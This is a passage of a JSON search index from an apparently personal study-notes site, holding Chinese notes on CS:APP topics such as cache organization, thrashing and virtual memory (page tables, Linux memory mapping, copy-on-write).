$\\rm valid + tag'$ \u5224\u65ad\u662f hit \u8fd8\u662f miss \u5b57\u9009\u62e9:\u2002 \u63d0\u53d6\u51fa\u76ee\u6807\u5b57\u8282 \u7f13\u5b58\u76f8\u8054\u5ea6\u7531 set \u5185\u884c\u6570\u5212\u5206: \u76f4\u63a5\u6620\u5c04 :\u2002 \u6bcf\u7ec4\u4e00\u884c\uff0c\u53ef\u80fd\u662f $\\rm tag=0,\\ index=2^n$\uff0c\u6216 $\\rm tag$ \u4e0d\u4e3a 0 \u4e14\u8ba9\u6bcf\u4e2a set \u53ea\u6709\u4e00\u4e2a line \u7b80\u5355\uff0c\u5bb9\u6613\u5b9e\u73b0\uff0c\u4f46\u4e5f\u5bb9\u6613\u51b2\u7a81 \u7ec4\u76f8\u8054 :\u2002 $\\rm tag, index$ \u90fd\u4e0d\u4e3a 0\uff0c\u4e14\u6bcf\u7ec4\u4e0d\u53ea\u6709\u4e00\u884c \u666e\u901a\u7f13\u5b58\uff0ccache miss \u4e14\u7ec4\u5185\u7f13\u5b58\u5757\u5df2\u6ee1\uff0c\u9700\u8981\u4e00\u4e9b\u7b56\u7565\u6267\u884c\u66ff\u6362\uff0c\u5982 LRU\u3001LFU \u5168\u76f8\u8054 :\u2002 $\\rm tag=2^n,\\ index=0$\uff0c\u7f13\u5b58\u53ea\u6709 1 \u7ec4 \u4e0d\u6613\u53d1\u751f\u51b2\u7a81\uff0c\u4f46\u7ec4\u5185\u7ebf\u6027\u641c\u7d22\u548c $\\rm tag$ \u5339\u914d\u9700\u8981\u8f83\u591a\u65f6\u95f4 e.g. hash(addr) $m$: \u4e0b\u7ea7\u5730\u5740\u6570 $S=2^s$: set \u6570 $E=2^e$: \u6bcf\u4e2a set \u7684 line \u6570 $B=2^b$: \u6bcf\u4e2a block \u7684 byte \u6570","title":"(4). \u7f13\u5b58\u7ec4\u7ec7\u65b9\u5f0f"},{"location":"_csapp/_Memory/1/#3_1","text":"","title":"3. \u7f16\u5199\u9ad8\u901f\u7f13\u5b58\u53cb\u597d\u7684\u4ee3\u7801"},{"location":"_csapp/_Memory/1/#1_3","text":"\u9ad8\u901f\u7f13\u5b58\u6027\u80fd\u8861\u91cf\u6307\u6807: \u4e0d\u547d\u4e2d\u7387:\u2002 \u4e0d\u547d\u4e2d\u6570\u91cf / \u5f15\u7528\u6570\u91cf \u547d\u4e2d\u65f6\u95f4:\u2002 \u4ece\u9ad8\u901f\u7f13\u5b58\u4f20\u9001\u4e00\u4e2a\u5b57\u5230 cpu \u7684\u65f6\u95f4\uff0c\u5305\u62ec\u7ec4\u9009\u62e9\u3001\u884c\u5339\u914d\u3001\u5b57\u9009\u62e9\u7684\u65f6\u95f4 \u4e0d\u547d\u4e2d\u5904\u7f5a:\u2002 L1 \u7684\u5904\u7f5a\u901a\u5e38\u662f\u6570\u5341\u4e2a\u5468\u671f\uff0c\u4e3b\u5b58\u7684\u89e6\u53d1\u901a\u5e38\u662f 200 \u4e2a\u5468\u671f \u7531\u6b64\uff0c\u9ad8\u901f\u7f13\u5b58\u6027\u80fd\u7684\u6298\u4e2d\u56e0\u7d20\u6709: \u9ad8\u901f\u7f13\u5b58\u5927\u5c0f:\u2002 \u5927\u7f13\u5b58\u53ef\u80fd\u63d0\u9ad8\u547d\u4e2d\u7387\uff0c\u4f46\u4f1a\u589e\u52a0\u547d\u4e2d\u65f6\u95f4 \u5757\u5927\u5c0f:\u2002 \u5927\u5757\u53ef\u80fd\u63d0\u9ad8\u7a0b\u5e8f\u7684\u7a7a\u95f4\u5c40\u90e8\u6027\uff0c\u63d0\u9ad8\u547d\u4e2d\u7387\uff0c\u4f46\u4e5f\u4f1a\u964d\u4f4e\u7f13\u5b58\u7684\u884c\u6570\uff0c\u635f\u5bb3\u65f6\u95f4\u5c40\u90e8\u6027\u66f4\u597d\u7684\u7a0b\u5e8f\u7684\u547d\u4e2d\u7387\uff0c\u4e5f\u4f1a\u589e\u52a0\u4e0d\u547d\u4e2d\u5904\u7f5a \u76f8\u8054\u5ea6:\u2002 \u76f8\u8054\u5ea6\u5927\u53ef\u80fd\u589e\u52a0\u547d\u4e2d\u7387\uff0c\u4f46\u63d0\u9ad8\u6210\u672c\u3001\u964d\u4f4e\u901f\u5ea6","title":"(1). \u6027\u80fd"},{"location":"_csapp/_Memory/1/#2_3","text":"\u4ee5\u76f4\u63a5\u6620\u5c04\u7f13\u5b58 $(S, E, B, m) = (2, 1, 16, 8)$ \u4e3a\u4f8b\uff0c\u7f13\u5b58\u7531\u4e24\u4e2a\u7ec4\u7ec4\u6210\uff0c\u6bcf\u4e2a\u5757 16 \u5b57\u8282 (4 x float) float dotproduct ( float x [ 8 ], float y [ 8 ]) { float sum = 0.0 ; int i ; for ( i = 0 ; i < 8 ; ++ i ) sum += x [ i ] * y [ i ]; return sum ; } x[i] \u548c y[i] \u603b\u662f\u6620\u5c04\u5230\u76f8\u540c\u7684\u7f13\u5b58\u7ec4\uff0c\u7f13\u5b58\u53cd\u590d\u52a0\u8f7d\u3001\u66ff\u6362\u76f8\u540c\u7684\u5b58\u50a8\u5757\uff0c\u5373\u79f0\u4e3a\u6296\u52a8 (thrash)\u3002\u5982\u679c\u66f4\u6539\u5b9a\u4e49\u4e3a float x[12] \uff0c\u5c31\u53ef\u4ee5\u5c06 x[i] \u548c y[i] \u6620\u5c04\u5230\u4e0d\u540c\u7684\u7f13\u5b58\u7ec4\u3002","title":"(2). \u6296\u52a8"},{"location":"_csapp/_Memory/vm/","text":"1. \u865a\u62df\u5185\u5b58 $\\leftrightarrow$ \u4e3b\u5b58: \u9875\u5f0f\u7f13\u5b58 \ud83e\uddd0 (1). \u7f13\u5b58\u7ed3\u6784\u8bbe\u8ba1 \ud83e\uddd0 \u7531\u4e8e\u78c1\u76d8\u672c\u8eab\u8bfb\u53d6\u5f88\u6162\uff0c\u800c\u4e14\u78c1\u76d8\u4ee5\u6247\u533a\u4e3a\u5355\u4f4d\u8bfb\u53d6\uff0c\u5bfc\u81f4 DRAM \u7f13\u5b58\u4e0d\u547d\u4e2d\u5f00\u9500\u5f88\u5927\uff0c\u4f7f\u5f97 \u865a\u62df\u9875\u5f88\u5927 \u4f7f\u7528\u5168\u76f8\u8054\u7ed3\u6784\uff0c\u5e76\u4f7f\u7528\u9875\u8868\u67e5\u8be2\u7f13\u5b58\u6620\u5c04\uff0c\u6bcf\u4e2a\u865a\u62df\u9875\u5bf9\u5e94\u4e00\u4e2a\u9875\u8868\u6761\u76ee (PTE) \u4efb\u610f\u65f6\u523b\uff0c\u4e00\u4e2a\u865a\u62df\u9875\u53ef\u80fd\u5904\u4e8e\u4ee5\u4e0b\u4e09\u4e2a\u72b6\u6001\u4e4b\u4e00: \u672a\u5206\u914d: \u6ca1\u6709\u6570\u636e\u4e0e\u4e4b\u5173\u8054\uff0c\u4e0d\u5360\u5b9e\u9645\u7684\u78c1\u76d8\u7a7a\u95f4 ($\\sf 0 + null$) \u672a\u7f13\u5b58: \u5df2\u4e0e\u67d0\u4e2a\u6587\u4ef6\u5173\u8054\uff0c\u4f46\u672a\u7f13\u5b58 ($\\sf 0 + VA$) \u5df2\u7f13\u5b58: \u5df2\u4e0e\u67d0\u4e2a\u6587\u4ef6\u5173\u8054\uff0c\u4e14\u7f13\u5b58\u5728\u4e3b\u5b58\u4e2d ($\\sf 1 + PA$) \u56e0\u6b64\uff0c\u5728\u8bf7\u6c42\u865a\u62df\u9875\u65f6\uff0c\u53ef\u76f4\u63a5\u6839\u636e PTE \u5224\u65ad\u865a\u62df\u9875\u5904\u4e8e\u54ea\u4e2a\u72b6\u6001\u3002 (2). \u5730\u5740\u7ffb\u8bd1 \ud83e\uddd0 \u7531\u4e8e\u4f7f\u7528\u9875\u8868\uff0c\u865a\u62df\u5730\u5740\u4e0d\u9700\u8981 $\\rm tag$ \u548c $\\rm index$ \u7684\u6982\u5ff5\uff0c\u53ea\u6709 $\\rm page\\ number + offset$\u3002 \u9875\u9762\u547d\u4e2d\u65f6\uff0cCPU \u786c\u4ef6\u7684\u5de5\u4f5c\u6d41\u7a0b \u2460. cpu \u751f\u6210\u4e00\u4e2a VA\uff0c\u4f20\u7ed9 MMU \u2461. MMU \u6839\u636e VA \u548c PTBR \u751f\u6210 PTE \u7684\u5730\u5740\uff0c\u5411 \u9ad8\u901f\u7f13\u5b58/\u4e3b\u5b58 \u53d1\u51fa\u8bf7\u6c42 \u2462. \u9ad8\u901f\u7f13\u5b58/\u4e3b\u5b58 \u5411 MMU \u8fd4\u56de PTE \u7684\u5185\u5bb9 \u2463. MMU \u6784\u9020\u7269\u7406\u5730\u5740\uff0c\u4f20\u56de\u7ed9 \u9ad8\u901f\u7f13\u5b58/\u4e3b\u5b58 \u2464. \u9ad8\u901f\u4e3b\u5b58/\u7f13\u5b58 \u8fd4\u56de\u7269\u7406\u5730\u5740\u7ed9 cpu \u7f3a\u9875\u65f6\uff0cCPU \u786c\u4ef6\u548c\u5185\u6838\u7684\u5de5\u4f5c\u6d41\u7a0b \u2460 \uff5e \u2462. \u548c\u9875\u9762\u547d\u4e2d\u65f6\u7684\u6d41\u7a0b\u76f8\u540c \u2463. PTE \u4e2d\u6709\u6548\u4f4d\u662f 0\uff0cMMU \u636e\u6b64\u89e6\u53d1\u4e00\u4e2a\u5f02\u5e38\uff0c\u4f20\u9012\u63a7\u5236\u7ed9 OS \u5185\u6838\u7684\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f \u2464 \uff5e \u2465. \u5904\u7406\u7a0b\u5e8f\u786e\u5b9a\u4e3b\u5b58\u4e2d\u7684\u727a\u7272\u9875\uff0c\u82e5\u8be5\u9875\u88ab\u4fee\u6539\uff0c\u5219\u5c06\u5176\u6362\u51fa\u5230\u78c1\u76d8\uff1b\u7136\u540e\uff0c\u8c03\u5165\u65b0\u9875\u5e76\u66f4\u65b0 PTE \u2466. \u7f3a\u9875\u5904\u7406\u7a0b\u5e8f\u8fd4\u56de\u5230\u539f\u6765\u7684\u8fdb\u7a0b\uff0c\u91cd\u65b0\u6267\u884c\u5bfc\u81f4\u7f3a\u9875\u7684\u6307\u4ee4 (3). \u591a\u7ea7\u9875\u8868 \ud83e\uddd0 \u76f4\u63a5\u5b9e\u73b0\u9875\u8868\u7684\u95ee\u9898: \u4ee5 32 \u4f4d\u5730\u5740\u7a7a\u95f4\u4e3a\u4f8b\uff0c\u6bcf\u4e2a PTE \u9700\u8981 $4\\rm byte$\uff0c\u5047\u8bbe\u9875\u9762\u5927\u5c0f $4\\rm KB=2^{12} byte$\uff0c\u5219\u5185\u5b58\u9700\u8981\u5e38\u9a7b\u4e00\u4e2a $\\rm 2^{32}/2^{12}\\times 4 byte = 4MB$ \u7684\u9875\u8868\u3002\u5bf9\u4e8e 64 \u4f4d\u7a7a\u95f4\u60c5\u51b5\u5c06\u66f4\u590d\u6742 \u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u5bf9\u4e8e\u4e00\u4e2a\u8fdb\u7a0b $4\\rm G$ \u7684\u5730\u5740\u7a7a\u95f4\u53ef\u80fd\u6709\u5f88\u591a\u90fd\u662f\u672a\u5206\u914d\u7684 \u901a\u5e38\u7528\u5c42\u6b21\u7ed3\u6784\u538b\u7f29\u9875\u8868\uff0c\u4ee5 2 \u7ea7\u9875\u8868\u4e3a\u4f8b: \u2003\u2003 \u4e00\u7ea7\u9875\u8868\u7684 PTE \u6620\u5c04\u4e00\u4e2a $\\rm 4MB$ \u7684 chunk\uff0c\u82e5 chunk i \u6bcf\u4e2a\u9875\u90fd\u662f\u672a\u5206\u914d\uff0cPTE i \u4e3a\u7a7a\uff1b\u5426\u5219 PTE i \u6307\u5411\u4e00\u4e2a\u4e8c\u7ea7\u9875\u8868\u7684\u57fa\u5740\uff0c\u4e8c\u7ea7\u9875\u8868\u7684 PTE \u8d1f\u8d23\u6620\u5c04\u4e00\u4e2a $4\\rm KB$ \u7684\u865a\u62df\u9875\u3002\u591a\u7ea7\u9875\u8868\u56e0\u800c\u8282\u7701\u4e86\u5185\u5b58: \u82e5\u4e00\u7ea7\u9875\u8868\u672a\u7a7a\uff0c\u4e8c\u7ea7\u9875\u8868\u4e0d\u9700\u8981\u5b58\u5728 \u53ea\u6709\u4e00\u7ea7\u9875\u8868\u5e38\u9a7b\u4e3b\u5b58\uff0c\u4e8c\u7ea7\u9875\u8868\u5e38\u7528\u7684\u90e8\u5206\u7f13\u5b58\u5728\u4e3b\u5b58\u4e2d 2. \u865a\u62df\u5185\u5b58 $\\leftrightarrow$ \u78c1\u76d8: \u5185\u5b58\u6620\u5c04 \ud83e\uddd0 (1). Linux \u865a\u62df\u5185\u5b58\u7ed3\u6784 \ud83e\uddd0 Linux \u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u7ef4\u62a4\u4e00\u4e2a\u5355\u72ec\u7684\u865a\u62df\u5730\u5740\u7a7a\u95f4\uff0c\u7ed3\u6784\u5982\u56fe \u865a\u62df\u5185\u5b58\u662f\u6bb5\u7684\u96c6\u5408\uff0c\u6bb5\u4e4b\u95f4\u53ef\u4ee5\u6709\u95f4\u9699\uff0c\u6bb5\u7531\u5df2\u5206\u914d\u7684\u865a\u62df\u9875\u7ec4\u6210\uff0c\u95f4\u9699\u5bf9\u5e94\u672a\u5206\u914d\u7684\u865a\u62df\u9875\uff0c\u672a\u5206\u914d\u7684\u865a\u62df\u9875\u4e0d\u5360\u7528\u78c1\u76d8\u7a7a\u95f4 \u5185\u6838\u865a\u62df\u5185\u5b58\u7684\u76f8\u540c\u90e8\u5206: \u5185\u6838\u4ee3\u7801\u3001\u5168\u5c40\u6570\u636e\u7ed3\u6784 \u88ab\u6620\u5c04\u5230\u6240\u6709\u8fdb\u7a0b\u5171\u4eab\u7684\u7269\u7406\u9875\u9762 \u7269\u7406\u5185\u5b58\u90e8\u5206\u548c\u4e3b\u5b58\u662f\u4e00\u4e00\u5bf9\u5e94\u7684\uff0c\u5176\u5b58\u5728\u662f\u4e3a\u4e86\u65b9\u4fbf\u5185\u6838\u8bbf\u95ee\u4e3b\u5b58\u7279\u5b9a\u4f4d\u7f6e\uff0c\u4f8b\u5982\u8bbf\u95ee\u9875\u8868 \u5185\u6838\u865a\u62df\u5185\u5b58\u7684\u4e0d\u540c\u90e8\u5206: \u4fdd\u5b58\u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587\uff0c\u4f8b\u5982 PCB\u3001\u5185\u6838\u6808\u3001\u9875\u8868 (2). PCB \ud83e\uddd0 Linux \u7684 PCB \u662f\u7ed3\u6784\u4f53 task_struct \uff0c\u5176\u4e2d\u4fdd\u5b58\u4e86\u8fd0\u884c\u8be5\u8fdb\u7a0b\u9700\u8981\u7684\u6240\u6709\u4fe1\u606f\uff0c\u4f8b\u5982 PID\u3001PC\u3001\u5bc4\u5b58\u5668\u503c\u3001\u4f18\u5148\u7ea7\u3001IO \u72b6\u6001\u3001\u53ef\u6267\u884c\u6587\u4ef6\u540d\u5b57\u7b49\u3002 \u2003\u2003 task_struct \u7684\u4e00\u4e2a\u6761\u76ee\u6307\u5411 mm_struct \uff0c\u63cf\u8ff0 VM \u7684\u72b6\u6001\uff1b\u5176\u4e2d\u611f\u5174\u8da3\u7684\u5b57\u6bb5: pgd \u6307\u5411\u4e00\u7ea7\u9875\u8868\u7684\u57fa\u5740 mmap \u6307\u5411\u533a\u57df\u7ed3\u6784 mm_area_structs \u7684\u94fe\u8868\uff0c mmap_rb \u6307\u5411\u76f8\u540c\u5143\u7d20\u7684\u7ea2\u9ed1\u6811 (\u7cfb\u7edf\u7ea7\u5185\u5b58\u6620\u5c04) vm_start / vm_end \u6bb5\u7684\u5f00\u59cb\u548c\u7ed3\u675f vm_prot \u8be5\u6bb5\u5305\u542b\u7684\u6240\u6709\u9875\u7684\u8bfb\u5199\u6743\u9650 vm_flags \u8be5\u6bb5\u662f\u5171\u4eab\u8fd8\u662f\u79c1\u6709 (\u4ee5\u53ca\u5176\u4ed6\u4fe1\u606f) vm_file \u8be5\u6bb5\u7684\u5185\u5b58\u6620\u5c04\u7684\u6587\u4ef6\u4fe1\u606f Linux \u7f3a\u9875\u5224\u65ad\u903b\u8f91 \u5047\u8bbe MMU \u8bd5\u56fe\u7ffb\u8bd1\u67d0\u4e2a\u5730\u5740 $\\rm A$ \u65f6\uff0c\u89e6\u53d1\u4e86\u4e00\u4e2a\u7f3a\u9875\uff0c\u5904\u7406\u7a0b\u5e8f\u7684\u6267\u884c\u903b\u8f91\u4e3a: \u5224\u65ad $\\rm A$ \u662f\u5426\u5728\u67d0\u4e2a vm_area_structs \u6307\u5b9a\u7684\u533a\u57df\u5185 (\u5224\u65ad\u662f\u5426\u5df2\u5206\u914d?)\uff0c\u5982\u679c\u4e0d\u5728\u5219\u89e6\u53d1\u6bb5\u9519\u8bef\u5e76\u7ec8\u6b62\u8fd9\u4e2a\u8fdb\u7a0b \u5224\u65ad\u662f\u5426\u6709\u6743\u9650\u8bfb\u6216\u5199\u8be5\u9875\uff0c\u82e5\u4e0d\u5408\u6cd5\u5219\u89e6\u53d1\u4e00\u4e2a\u4fdd\u62a4\u5f02\u5e38 \u6b64\u65f6\uff0c\u5185\u6838\u77e5\u9053\u8fd9\u4e2a\u7f3a\u9875\u662f\u5bf9\u5408\u6cd5\u865a\u62df\u5730\u5740\u8fdb\u884c\u5408\u6cd5\u64cd\u4f5c\u9020\u6210\u7684\u3002\u5185\u6838\u9009\u62e9\u4e00\u4e2a\u727a\u7272\u9875 (\u82e5\u4fee\u6539\u8fc7\u5219\u5199\u56de\u78c1\u76d8)\uff0cCPU \u91cd\u65b0\u6267\u884c\u5bfc\u81f4\u7f3a\u9875\u7684\u6307\u4ee4 (3). \u5185\u5b58\u6620\u5c04 \ud83e\uddd0 \u5185\u5b58\u6620\u5c04\u628a\u865a\u62df\u5185\u5b58\u7cfb\u7edf\u96c6\u6210\u5230\u4f20\u7edf\u7684\u6587\u4ef6\u7cfb\u7edf\uff0c\u63d0\u4f9b\u4e86\u4e00\u79cd\u7b80\u5355\u800c\u9ad8\u6548 (\u8282\u7ea6\u4e3b\u5b58) \u7684\u65b9\u5f0f\u52a0\u8f7d\u4ee3\u7801\u6bb5\u548c\u6570\u636e\u6bb5\u7684\u65b9\u5f0f\u3002 \u4e00\u4e2a\u6587\u4ef6\u88ab\u6620\u5c04\u5230\u865a\u62df\u5185\u5b58\u7684\u4e00\u4e2a\u533a\u57df: \u4f5c\u4e3a\u5171\u4eab\u5bf9\u8c61\uff0c\u8fdb\u7a0b\u5bf9\u865a\u5b58\u5171\u4eab\u533a\u7684\u5199\u64cd\u4f5c\uff0c\u4e5f\u4f1a\u53cd\u6620\u5230\u539f\u59cb\u6587\u4ef6\u4e2d (\u6ca1\u627e\u5230\u4f8b\u5b50) \u4f5c\u4e3a\u79c1\u6709\u5bf9\u8c61\uff0c\u8fdb\u7a0b\u5bf9\u79c1\u6709\u533a\u7684\u5199\u64cd\u4f5c\uff0c\u5bf9\u5176\u4ed6\u8fdb\u7a0b\u662f\u4e0d\u53ef\u89c1\u7684\uff0c\u4e14\u4e0d\u9700\u8981\u53cd\u6620\u5230\u539f\u6587\u4ef6\u4e2d\uff0c\u4f7f\u7528\u5199\u65f6\u590d\u5236 (copy-on-write) \u8282\u7701\u5185\u5b58 Linux \u865a\u62df\u5185\u5b58\u7684\u5171\u4eab\u673a\u5236 \u8fdb\u7a0b 1 \u5c06\u4e00\u4e2a\u5171\u4eab\u5bf9\u8c61\u6620\u5c04\u5230\u81ea\u5df1\u7684\u865a\u62df\u5185\u5b58\u533a\u57df\u4e2d \u8fdb\u7a0b 2 \u5c06\u540c\u4e00\u4e2a\u5171\u4eab\u5bf9\u8c61\u6620\u5c04\u5230\u81ea\u5df1\u7684\u865a\u5b58\u533a\u57df\uff0c\u7531\u4e8e\u6bcf\u4e2a\u5bf9\u8c61\u6709\u552f\u4e00\u7684\u6587\u4ef6\u540d\uff0c\u5185\u6838\u53ef\u4ee5\u5224\u5b9a\u5df2\u7ecf\u6709\u8fdb\u7a0b\u5171\u4eab\u4e86\u8fd9\u4e2a\u5bf9\u8c61\uff0c\u4e3b\u5b58\u4e2d\u53ea\u9700\u8981\u5b58\u653e\u4e00\u4e2a\u526f\u672c\u5373\u53ef (\u731c\u6d4b: \u8fdb\u7a0b 2 \u82e5\u53d1\u73b0\u5171\u4eab\u533a\u57df\u672a\u7f13\u5b58\uff0c\u4f1a\u5148\u53bb\u8fdb\u7a0b\u4e00\u7684\u9875\u8868\u770b\u770b\u7f13\u5b58\u6ca1\u6709\uff0c\u518d\u51b3\u5b9a\u662f\u5426\u89e6\u53d1\u7f3a\u9875) \u6682\u65f6\u6ca1\u627e\u5230\u9700\u8981\u4fee\u6539\u5171\u4eab\u5bf9\u8c61\u7684\u4f8b\u5b50\uff0c\u4e66\u91cc\u4e5f\u6ca1\u63d0 \u8fdb\u7a0b 1 \u548c\u8fdb\u7a0b 2 \u6620\u5c04\u4e86\u4e00\u4e2a\u79c1\u6709\u5bf9\u8c61\uff0c\u7531\u4e8e\u8fd8\u6ca1\u5199\u5165\uff0c\u5148\u6682\u65f6\u5171\u4eab\uff0c\u5e76\u5c06\u9875\u8868\u6761\u76ee\u90fd\u6807\u8bb0\u4e3a\u53ea\u8bfb (\u4e3a\u4e86\u89e6\u53d1\u5f02\u5e38)\uff0c\u5c06 area_struct \u90fd\u6807\u8bb0\u4e3a\u5199\u65f6\u590d\u5236 \u5f53\u6709\u4e00\u4e2a\u8fdb\u7a0b\u5411\u79c1\u6709\u533a\u57df\u6267\u884c\u4e00\u4e2a\u5199\u64cd\u4f5c\uff0c\u4f1a\u8df3\u8f6c\u5230\u6545\u969c\u5904\u7406\u7a0b\u5e8f\uff0c\u521b\u5efa\u4e00\u4e2a\u88ab\u5199\u7684\u865a\u62df\u9875\u7684\u526f\u672c\uff0c\u7136\u540e\u5199\u8fdb\u7a0b\u66f4\u65b0 PTE\uff0c\u6700\u540e\u6545\u969c\u5904\u7406\u7a0b\u5e8f\u8fd4\u56de\uff0c\u91cd\u65b0\u6267\u884c\u8fd9\u4e2a\u5199\u64cd\u4f5c \u6bb5\u5f0f\u5185\u5b58\u7ba1\u7406 \u8fd9\u91cc\u7684\u6bb5\u548c\u7a0b\u5e8f\u5206\u6bb5\u4e0d\u662f\u4e00\u4e2a\u6982\u5ff5\uff0c\u662f\u5b8c\u5168\u7684\u5904\u7406\u5668\u6982\u5ff5\uff0c\u662f x86 \u67b6\u6784\u72ec\u6709\u7684\uff0cLinux \u6ca1\u6709\u8003\u8651 8086: \u2002 cpu \u53ea\u6709 16 \u4f4d \u800c\u5730\u5740\u603b\u7ebf\u6709 20 \u4f4d\uff0c\u56e0\u6b64\u901a\u8fc7 cpu \u548c\u5bc4\u5b58\u5668 16 \u4f4d\u6bb5\u57fa\u5740 + 4 \u4f4d\u6bb5\u504f\u79fb\u5bfb\u5740 80386: \u2002 \u5f15\u5165\u4e86\u865a\u62df\u5185\u5b58\u7684\u6982\u5ff5\uff0c\u5bfb\u5740\u6a21\u5f0f\u53d8\u4e3a \u903b\u8f91\u5730\u5740 -\u6bb5\u8868-> \u7ebf\u6027\u5730\u5740 (VM) -\u9875\u8868-> \u7269\u7406\u5730\u5740 x86-64: \u2002 \u5e9f\u5f03\u6bb5\u5f0f\u5185\u5b58\u7ba1\u7406 \u9875\u5f0f\u5185\u5b58\u7ba1\u7406\u51fa\u73b0\u5728\u6bb5\u5f0f\u4e4b\u540e\uff0c\u662f\u66f4\u5148\u8fdb\u7684\u6982\u5ff5\uff0c80386 \u7684\u590d\u6742\u8bbe\u8ba1\u6ca1\u5fc5\u8981\u6df1\u7a76\uff0c\u731c\u6d4b\u53ef\u80fd\u662f\u4e3a\u4e86\u517c\u5bb9 \u603b\u7ed3 \ud83e\uddd0 \u865a\u62df\u5185\u5b58\u4f5c\u4e3a\u4e00\u79cd\u62bd\u8c61\uff0c\u7531\u4e24\u90e8\u5206\u7ec4\u6210 \u901a\u8fc7\u9875\u5f0f\u7ba1\u7406 (\u7f13\u5b58) \u548c\u4e3b\u5b58\u5173\u8054 (\u786c\u4ef6 + OS \u5f02\u5e38\uff0c\u7ba1\u7406\u9875\u9762) \u901a\u8fc7\u5185\u5b58\u6620\u5c04\u548c\u6587\u4ef6\u7cfb\u7edf\u5173\u8054 (OS\uff0c\u5206\u914d\u9875\u9762) \u865a\u62df\u5185\u5b58\u9664\u4e86\u4f7f\u7528\u7f13\u5b58\u8282\u7701\u4e86\u4e3b\u5b58\u7684\u7a7a\u95f4\u5916\uff0c\u5728\u5185\u5b58\u7ba1\u7406\u65b9\u9762\u8fd8\u6709\u5f88\u591a\u4f18\u70b9: \u7b80\u5316\u52a0\u8f7d: loader \u53ea\u9700\u8981\u5b9e\u73b0\u7c7b\u4f3c\u5185\u5b58\u6620\u5c04\u7684\u529f\u80fd\uff0c\u5206\u914d\u865a\u62df\u9875\uff0c\u5e76\u5c06\u6587\u4ef6\u7684 section \u6620\u5c04\u5230 vm_area_structs \u4e0a\uff0c\u8be5\u8fc7\u7a0b\u5e76\u6ca1\u6709\u4ece\u78c1\u76d8\u5411\u4e3b\u5b58\u62f7\u8d1d\u4efb\u4f55\u5185\u5bb9 \u7b80\u5316\u94fe\u63a5: \u4e0d\u540c\u8fdb\u7a0b\u6709\u76f8\u540c\u5e03\u5c40\u7684\u5730\u5740\u7a7a\u95f4\uff0c\u4f7f\u5f97\u94fe\u63a5\u5668\u7684\u5b9e\u73b0\u4e0d\u7528\u8003\u8651\u5b9e\u9645\u7684\u7269\u7406\u5730\u5740 \u7b80\u5316\u5171\u4eab: \u4e0d\u540c\u8fdb\u7a0b\u5171\u4eab\u7684\u90e8\u5206\uff0c\u5728\u7269\u7406\u5185\u5b58\u4e2d (\u548c\u78c1\u76d8\u4e0a?) \u53ea\u9700\u8981\u4e00\u4e2a\u526f\u672c \u7b80\u5316\u5185\u5b58\u5206\u914d: \u548c\u52a0\u8f7d\u4e00\u6837\uff0c\u53ea\u9700\u5206\u914d\u8fde\u7eed\u7684\u865a\u62df\u9875\u7136\u540e\u505a\u5185\u5b58\u6620\u5c04\u5373\u53ef\uff0c\u4e0d\u5fc5\u7269\u7406\u5185\u5b58\u5982\u4f55\u5de5\u4f5c (\u4f8b\u5982\u4e0d\u9700\u8981\u5173\u5fc3\u7269\u7406\u9875\u662f\u5426\u8fde\u7eed) \u7b80\u5316\u6743\u9650\u63a7\u5236: \u5728 PTE \u4e0a\u8bbe\u7f6e\u6807\u8bb0\u4f4d\uff0c\u5b9e\u73b0\u8bfb\u5199\u6743\u9650\u3001\u8fdb\u7a0b\u5728\u8d85\u7ea7\u7528\u6237\u6a21\u5f0f\u4e0b\u624d\u80fd\u8bbf\u95ee\u8be5\u9875\u7b49","title":"2. virtual memory"},{"location":"_csapp/_Memory/vm/#1-leftrightarrow","text":"","title":"1. \u865a\u62df\u5185\u5b58 $\\leftrightarrow$ \u4e3b\u5b58: \u9875\u5f0f\u7f13\u5b58"},{"location":"_csapp/_Memory/vm/#1","text":"\u7531\u4e8e\u78c1\u76d8\u672c\u8eab\u8bfb\u53d6\u5f88\u6162\uff0c\u800c\u4e14\u78c1\u76d8\u4ee5\u6247\u533a\u4e3a\u5355\u4f4d\u8bfb\u53d6\uff0c\u5bfc\u81f4 DRAM \u7f13\u5b58\u4e0d\u547d\u4e2d\u5f00\u9500\u5f88\u5927\uff0c\u4f7f\u5f97 \u865a\u62df\u9875\u5f88\u5927 \u4f7f\u7528\u5168\u76f8\u8054\u7ed3\u6784\uff0c\u5e76\u4f7f\u7528\u9875\u8868\u67e5\u8be2\u7f13\u5b58\u6620\u5c04\uff0c\u6bcf\u4e2a\u865a\u62df\u9875\u5bf9\u5e94\u4e00\u4e2a\u9875\u8868\u6761\u76ee (PTE) \u4efb\u610f\u65f6\u523b\uff0c\u4e00\u4e2a\u865a\u62df\u9875\u53ef\u80fd\u5904\u4e8e\u4ee5\u4e0b\u4e09\u4e2a\u72b6\u6001\u4e4b\u4e00: \u672a\u5206\u914d: \u6ca1\u6709\u6570\u636e\u4e0e\u4e4b\u5173\u8054\uff0c\u4e0d\u5360\u5b9e\u9645\u7684\u78c1\u76d8\u7a7a\u95f4 ($\\sf 0 + null$) \u672a\u7f13\u5b58: \u5df2\u4e0e\u67d0\u4e2a\u6587\u4ef6\u5173\u8054\uff0c\u4f46\u672a\u7f13\u5b58 ($\\sf 0 + VA$) \u5df2\u7f13\u5b58: \u5df2\u4e0e\u67d0\u4e2a\u6587\u4ef6\u5173\u8054\uff0c\u4e14\u7f13\u5b58\u5728\u4e3b\u5b58\u4e2d ($\\sf 1 + PA$) \u56e0\u6b64\uff0c\u5728\u8bf7\u6c42\u865a\u62df\u9875\u65f6\uff0c\u53ef\u76f4\u63a5\u6839\u636e PTE \u5224\u65ad\u865a\u62df\u9875\u5904\u4e8e\u54ea\u4e2a\u72b6\u6001\u3002","title":"(1). \u7f13\u5b58\u7ed3\u6784\u8bbe\u8ba1"},{"location":"_csapp/_Memory/vm/#2","text":"\u7531\u4e8e\u4f7f\u7528\u9875\u8868\uff0c\u865a\u62df\u5730\u5740\u4e0d\u9700\u8981 $\\rm tag$ \u548c $\\rm index$ \u7684\u6982\u5ff5\uff0c\u53ea\u6709 $\\rm page\\ number + offset$\u3002 \u9875\u9762\u547d\u4e2d\u65f6\uff0cCPU \u786c\u4ef6\u7684\u5de5\u4f5c\u6d41\u7a0b \u2460. cpu \u751f\u6210\u4e00\u4e2a VA\uff0c\u4f20\u7ed9 MMU \u2461. MMU \u6839\u636e VA \u548c PTBR \u751f\u6210 PTE \u7684\u5730\u5740\uff0c\u5411 